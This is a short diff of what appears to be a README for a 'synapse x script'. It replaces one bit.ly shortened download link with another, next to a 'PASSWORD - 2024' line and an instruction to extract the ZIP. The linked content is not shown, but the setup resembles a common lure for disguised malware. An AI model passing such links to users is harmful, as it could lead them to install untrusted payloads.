@@ -3,7 +3,7 @@
 Installation To install synapse x script, follow these simple steps:
 
 PASSWORD - 2024
-[Download the synapse x script](https://bit.ly/4fC6dNp)
+[Download the synapse x script](https://bit.ly/4126ogy)
 
 Extract the downloaded ZIP file to your desired location on your system.
 
